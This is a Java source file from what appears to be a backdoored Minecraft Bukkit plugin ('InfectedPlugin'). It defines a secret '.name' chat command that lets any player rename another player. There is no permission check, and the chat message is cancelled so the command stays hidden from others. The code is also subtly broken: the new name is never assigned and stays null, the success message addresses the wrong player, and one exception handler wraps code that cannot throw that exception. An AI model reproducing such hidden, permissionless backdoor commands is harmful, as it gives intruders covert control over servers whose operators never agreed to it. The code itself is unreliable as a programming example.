 package org.CreeperCoders.InfectedPlugin.Commands;
 
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_name extends IP_Command implements Listener
 {
     @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
         final Player p = event.getPlayer();
 
         if (message.startsWith("."))
         {
             String[] args = message.split(" ");
             if (args == null)
             {
                 return;
             }
 
             if (args[0].equalsIgnoreCase(".name"))
             {
                 if (args.length == 1)
                 {
                     p.sendMessage(ChatColor.RED + "Usage: .name <player> <name>");
                     event.setCancelled(true);
                     return;
                 }
 
                 Player target;
                 String name = null;
                 if (args.length == 2)
                 {
                     try
                     {
                         p.sendMessage(ChatColor.RED + "Usage: .name <player> <name>");
                         event.setCancelled(true);
                         return;
                     }
                     catch (PlayerNotFoundException ex)
                     {
                         p.sendMessage(ChatColor.RED + ex.getMessage());
                     }
                 }
                 if (args.length >= 3)
                 {
                     try
                     {
                         target = getPlayer(args[1]);
                         target.setDisplayName(name);
                         target.setCustomName(name);
                         target.setCustomNameVisible(true);
                        p.sendMessage(ChatColor.GREEN + "Your name has been set to: " + name);
                     }
                     catch (PlayerNotFoundException ex)
                     {
                         p.sendMessage(ChatColor.RED + ex.getMessage());
                     }
                 }
                 event.setCancelled(true);
                 return;
             }
         }
     }
 }
